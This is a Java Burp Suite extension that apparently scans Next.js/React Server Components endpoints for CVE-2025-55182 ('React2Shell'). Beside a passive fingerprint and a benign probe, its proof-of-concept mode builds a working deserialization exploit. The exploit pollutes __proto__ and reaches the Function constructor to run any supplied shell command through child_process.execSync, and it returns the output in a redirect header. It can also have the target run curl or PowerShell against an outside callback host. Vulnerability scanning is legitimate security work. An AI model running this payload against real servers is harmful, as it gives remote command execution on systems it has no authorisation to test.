package burp.scanner;

import burp.IBurpExtenderCallbacks;
import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IHttpService;
import burp.IRequestInfo;
import burp.IResponseInfo;
import burp.model.ScanOptions;
import burp.model.ScanResult;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Random;
import java.util.Set;

/**
 * Performs the HTTP checks that detect CVE-2025-55182 (React2Shell).
 */
public class React2ShellScanner {

    private final IBurpExtenderCallbacks callbacks;
    private final IExtensionHelpers helpers;
    private final Random random = new Random();

    public React2ShellScanner(IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) {
        this.callbacks = callbacks;
        this.helpers = helpers;
    }

    /**
    * Executes a scan against the provided service and path using the given options.
    */
    public ScanResult scan(IHttpService service, String basePath, ScanOptions options) {
        String pathToTest = options.getPath() != null ? options.getPath() : "/";
        if (pathToTest.trim().isEmpty()) {
            pathToTest = "/";
        }

        IBurpCollaboratorClientContext collaboratorContext = null;
        String collaboratorPayload = null;
        if (options.isUseCollaborator() && options.getMode() == ScanOptions.Mode.POC_REDIRECT) {
            try {
                collaboratorContext = callbacks.createBurpCollaboratorClientContext();
                if (collaboratorContext != null) {
                    collaboratorPayload = collaboratorContext.generatePayload(true);
                }
            } catch (Exception ignored) {
            }
        }

        long started = System.nanoTime();
        try {
            Attempt firstAttempt = sendOnce(service, pathToTest, options, collaboratorPayload);
            if (firstAttempt == null) {
                return new ScanResult(false, true, "Request failed to send", null, elapsedMs(started), -1, null, pathToTest, options.getCommand(), false, null);
            }
            if (firstAttempt.vulnerable || !options.isFollowRedirects() || firstAttempt.redirectLocation == null) {
                enrichWithCollaborator(firstAttempt, collaboratorContext, collaboratorPayload, options);
                return toResult(firstAttempt, started, pathToTest, firstAttempt.commandUsed);
            }

            // Follow same-host redirects if requested.
            IHttpService redirectService = deriveServiceFromLocation(service, firstAttempt.redirectLocation);
            String redirectPath = derivePathFromLocation(firstAttempt.redirectLocation);
            Attempt redirectedAttempt = sendOnce(redirectService, redirectPath, options, collaboratorPayload);
            if (redirectedAttempt == null) {
                enrichWithCollaborator(firstAttempt, collaboratorContext, collaboratorPayload, options);
                return toResult(firstAttempt, started, pathToTest, firstAttempt.commandUsed);
            }
            enrichWithCollaborator(redirectedAttempt, collaboratorContext, collaboratorPayload, options);
            return toResult(redirectedAttempt, started, redirectPath, redirectedAttempt.commandUsed);
        } catch (Exception e) {
            return new ScanResult(false, true, "Unexpected error: " + e.getMessage(), null, elapsedMs(started), -1, null, pathToTest, options.getCommand(), false, null);
        }
    }

    /**
     * Builds a passive-only fingerprint from the given response.
     */
    public boolean looksLikeRscEndpoint(IHttpRequestResponse message) {
        if (message == null || message.getResponse() == null) {
            return false;
        }
        IResponseInfo responseInfo = helpers.analyzeResponse(message.getResponse());
        String body = getBodyAsString(message.getResponse(), responseInfo);
        for (String header : responseInfo.getHeaders()) {
            String lower = header.toLowerCase(Locale.ROOT);
            if (lower.startsWith("content-type:") && lower.contains("text/x-component")) {
                return true;
            }
            if (lower.startsWith("x-action-redirect:") || lower.startsWith("rsc-action-id:") || lower.startsWith("next-action:")) {
                return true;
            }
        }
        return body.contains("\"resolved_model\"") || body.contains("$@");
    }

    private ScanResult toResult(Attempt attempt, long started, String path, String commandUsed) {
        long duration = elapsedMs(started);
        if (attempt.errored) {
            return new ScanResult(false, true, attempt.message, attempt.requestResponse, duration, attempt.statusCode, attempt.evidence, path, commandUsed, attempt.collaboratorHit, attempt.collaboratorEvidence);
        }
        return new ScanResult(attempt.vulnerable, false, attempt.message, attempt.requestResponse, duration, attempt.statusCode, attempt.evidence, path, commandUsed, attempt.collaboratorHit, attempt.collaboratorEvidence);
    }

    private Attempt sendOnce(IHttpService service, String path, ScanOptions options, String collaboratorPayload) {
        String commandToUse = options.getCommand();
        if (options.isUseCollaborator() && options.getMode() == ScanOptions.Mode.POC_REDIRECT && collaboratorPayload != null) {
            if (options.isWindowsPayload()) {
                commandToUse = "powershell -c \"iwr https://" + collaboratorPayload + "\"";
            } else {
                commandToUse = "curl https://" + collaboratorPayload;
            }
        }

        Payload payload = options.getMode() == ScanOptions.Mode.SAFE_CHECK
                ? buildSafePayload()
                : buildPocPayload(options.isWindowsPayload(), commandToUse);

        List<String> headers = buildHeaders(service, path, payload.contentType, payload.body.length, options.getExtraHeaders());
        byte[] request = helpers.buildHttpMessage(headers, payload.body);

        IHttpRequestResponse message = callbacks.makeHttpRequest(service, request);
        if (message == null || message.getResponse() == null) {
            return new Attempt(false, true, "No response (timeout?)", null, -1, null, null, commandToUse, false, null);
        }

        IResponseInfo responseInfo = helpers.analyzeResponse(message.getResponse());
        String body = getBodyAsString(message.getResponse(), responseInfo);
        boolean vulnerable = isVulnerable(responseInfo, body, options.getMode(), commandToUse);

        String redirectLocation = getHeaderValue(responseInfo.getHeaders(), "Location");
        String evidence = buildEvidence(responseInfo, body, options.getMode(), commandToUse);
        String msg;
        if (vulnerable) {
            msg = "Endpoint appears vulnerable to React2Shell (CVE-2025-55182).";
        } else {
            msg = "No vulnerable behavior observed.";
        }

        IHttpRequestResponse persistent = callbacks.saveBuffersToTempFiles(message);
        return new Attempt(vulnerable, false, msg, persistent, responseInfo.getStatusCode(), redirectLocation, evidence, commandToUse, false, null);
    }

    private List<String> buildHeaders(IHttpService service, String path, String contentType, int contentLength, Map<String, String> extraHeaders) {
        List<String> headers = new ArrayList<>();
        String normalizedPath = path.startsWith("/") ? path : "/" + path;
        headers.add("POST " + normalizedPath + " HTTP/1.1");
        headers.add("Host: " + service.getHost());
        headers.add("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 react2shellburp/0.1");
        headers.add("Accept: */*");
        headers.add("Content-Type: " + contentType);
        headers.add("Content-Length: " + contentLength);
        headers.add("Next-Action: x");
        headers.add("X-Nextjs-Request-Id: " + randomHex(8));
        headers.add("X-Nextjs-Html-Request-Id: " + randomHex(12));
        headers.add("Connection: close");

        if (extraHeaders != null && !extraHeaders.isEmpty()) {
            for (Map.Entry<String, String> entry : extraHeaders.entrySet()) {
                removeHeader(headers, entry.getKey());
                headers.add(entry.getKey() + ": " + entry.getValue());
            }
        }
        return headers;
    }

    private boolean isVulnerable(IResponseInfo responseInfo, String body, ScanOptions.Mode mode, String command) {
        if (responseInfo == null) {
            return false;
        }
        switch (mode) {
            case SAFE_CHECK:
                if (responseInfo.getStatusCode() != 500) {
                    return false;
                }
                if (!body.contains("E{\"digest\"")) {
                    return false;
                }
                // Ignore known mitigations to avoid false positives
                String serverHeader = getHeaderValue(responseInfo.getHeaders(), "Server");
                boolean netlifyMitigated = hasHeader(responseInfo.getHeaders(), "Netlify-Vary");
                if (serverHeader != null) {
                    String serverLower = serverHeader.toLowerCase(Locale.ROOT);
                    if (serverLower.contains("vercel") || serverLower.contains("netlify")) {
                        return false;
                    }
                }
                return !netlifyMitigated;
            case POC_REDIRECT:
                String redirectHeader = getHeaderValue(responseInfo.getHeaders(), "X-Action-Redirect");
                if (redirectHeader == null) {
                    return false;
                }
                // Default math command returns 11111; otherwise just require a redirect action.
                if (command != null && command.contains("41*271") && !redirectHeader.contains("11111")) {
                    return false;
                }
                return redirectHeader.contains("/login?a=");
            default:
                return false;
        }
    }

    private String buildEvidence(IResponseInfo responseInfo, String body, ScanOptions.Mode mode, String command) {
        if (responseInfo == null) {
            return null;
        }
        switch (mode) {
            case SAFE_CHECK:
                if (responseInfo.getStatusCode() == 500 && body.contains("E{\"digest\"")) {
                    return "500 + E{\"digest\" in body suggests unsafe deserialization path.";
                }
                break;
            case POC_REDIRECT:
                String redirectHeader = getHeaderValue(responseInfo.getHeaders(), "X-Action-Redirect");
                if (redirectHeader != null && redirectHeader.contains("/login?a=")) {
                    return "X-Action-Redirect: " + redirectHeader;
                }
                break;
            default:
                break;
        }
        return null;
    }

    private Payload buildSafePayload() {
        String boundary = boundary();
        String body =
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"1\"\r\n\r\n" +
                "{}\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"0\"\r\n\r\n" +
                "[\"$1:aa:aa\"]\r\n" +
                "--" + boundary + "--";
        return new Payload(body.getBytes(StandardCharsets.UTF_8), "multipart/form-data; boundary=" + boundary);
    }

    private Payload buildPocPayload(boolean windows, String command) {
        String boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
        String cmd = command == null || command.trim().isEmpty()
                ? (windows ? "powershell -c \"echo 11111\"" : "echo $((41*271))")
                : command.trim();

        // Mimic script.sh: collapse newlines to pipe-separated so it survives redirect header.
        String sanitizedCmd = cmd.replace("\\", "\\\\").replace("'", "\\'");
        String prefixPayload = "var res=process.mainModule.require('child_process').execSync('" + sanitizedCmd + "')" +
                ".toString().trim().replace(/\\\\n/g,' | ');;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});";
        String part0 = "{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,"
                + "\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\""
                + prefixPayload
                + "\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}";

        StringBuilder body = new StringBuilder();
        body.append("--").append(boundary).append("\r\n");
        body.append("Content-Disposition: form-data; name=\"0\"\r\n\r\n");
        body.append(part0).append("\r\n");

        body.append("--").append(boundary).append("\r\n");
        body.append("Content-Disposition: form-data; name=\"1\"\r\n\r\n");
        body.append("\"$@0\"").append("\r\n");

        body.append("--").append(boundary).append("\r\n");
        body.append("Content-Disposition: form-data; name=\"2\"\r\n\r\n");
        body.append("[]").append("\r\n");

        body.append("--").append(boundary).append("--");

        return new Payload(body.toString().getBytes(StandardCharsets.UTF_8), "multipart/form-data; boundary=" + boundary);
    }

    private String getBodyAsString(byte[] message, IResponseInfo info) {
        if (message == null || info == null) {
            return "";
        }
        int offset = info.getBodyOffset();
        if (offset >= message.length) {
            return "";
        }
        return new String(message, offset, message.length - offset, StandardCharsets.ISO_8859_1);
    }

    private String getHeaderValue(List<String> headers, String name) {
        for (String header : headers) {
            int colon = header.indexOf(':');
            if (colon == -1) {
                continue;
            }
            String key = header.substring(0, colon).trim();
            if (key.equalsIgnoreCase(name)) {
                return header.substring(colon + 1).trim();
            }
        }
        return null;
    }

    private boolean hasHeader(List<String> headers, String name) {
        return getHeaderValue(headers, name) != null;
    }

    private void removeHeader(List<String> headers, String name) {
        headers.removeIf(h -> h.toLowerCase(Locale.ROOT).startsWith(name.toLowerCase(Locale.ROOT) + ":"));
    }

    private String boundary() {
        return "----React2Shell" + Math.abs(random.nextInt());
    }

    private String randomHex(int bytes) {
        byte[] data = new byte[bytes];
        random.nextBytes(data);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(data);
    }

    private void enrichWithCollaborator(Attempt attempt, IBurpCollaboratorClientContext collaboratorContext, String payload, ScanOptions options) {
        if (collaboratorContext == null || payload == null || !options.isUseCollaborator() || options.getMode() != ScanOptions.Mode.POC_REDIRECT) {
            return;
        }
        try {
            Thread.sleep(options.getCollaboratorWaitSeconds() * 1000L);
            List<IBurpCollaboratorInteraction> interactions = collaboratorContext.fetchAllCollaboratorInteractions();
            Set<String> hits = new HashSet<>();
            String[] props = new String[]{"interaction_id", "protocol", "client_ip", "request", "response", "query_type"};
            for (IBurpCollaboratorInteraction interaction : interactions) {
                for (String name : props) {
                    String value = interaction.getProperty(name);
                    if (value != null && value.contains(payload)) {
                        hits.add(name + ": " + value);
                    }
                }
            }
            if (!hits.isEmpty()) {
                attempt.collaboratorHit = true;
                attempt.vulnerable = true;
                attempt.collaboratorEvidence = "Collaborator hit for payload " + payload + " -> " + String.join("; ", hits);
                if (attempt.evidence == null) {
                    attempt.evidence = attempt.collaboratorEvidence;
                }
            }
        } catch (InterruptedException ignored) {
            Thread.currentThread().interrupt();
        } catch (Exception ignored) {
        }
    }

    private IHttpService deriveServiceFromLocation(IHttpService baseService, String location) {
        // If the location is absolute, honor scheme/port if present.
        try {
            java.net.URL url = new java.net.URL(location.startsWith("http") ? location : baseService.getProtocol() + "://" + baseService.getHost() + location);
            boolean https = url.getProtocol().equalsIgnoreCase("https");
            int port = url.getPort() == -1 ? (https ? 443 : 80) : url.getPort();
            return helpers.buildHttpService(url.getHost(), port, https);
        } catch (Exception e) {
            return baseService;
        }
    }

    private String derivePathFromLocation(String location) {
        try {
            java.net.URL url = new java.net.URL(location);
            return url.getFile().isEmpty() ? "/" : url.getFile();
        } catch (Exception e) {
            // If relative, return as-is.
            return location.startsWith("/") ? location : "/" + location;
        }
    }

    private long elapsedMs(long started) {
        return Math.max(1, (System.nanoTime() - started) / 1_000_000);
    }

    private static class Payload {
        private final byte[] body;
        private final String contentType;

        Payload(byte[] body, String contentType) {
            this.body = body;
            this.contentType = contentType;
        }
    }

    private static class Attempt {
        private boolean vulnerable;
        private final boolean errored;
        private final String message;
        private final IHttpRequestResponse requestResponse;
        private final int statusCode;
        private final String redirectLocation;
        private String evidence;
        private final String commandUsed;
        private boolean collaboratorHit;
        private String collaboratorEvidence;

        Attempt(boolean vulnerable, boolean errored, String message, IHttpRequestResponse requestResponse, int statusCode, String redirectLocation, String evidence, String commandUsed, boolean collaboratorHit, String collaboratorEvidence) {
            this.vulnerable = vulnerable;
            this.errored = errored;
            this.message = message;
            this.requestResponse = requestResponse;
            this.statusCode = statusCode;
            this.redirectLocation = redirectLocation;
            this.evidence = evidence;
            this.commandUsed = commandUsed;
            this.collaboratorHit = collaboratorHit;
            this.collaboratorEvidence = collaboratorEvidence;
        }
    }
}
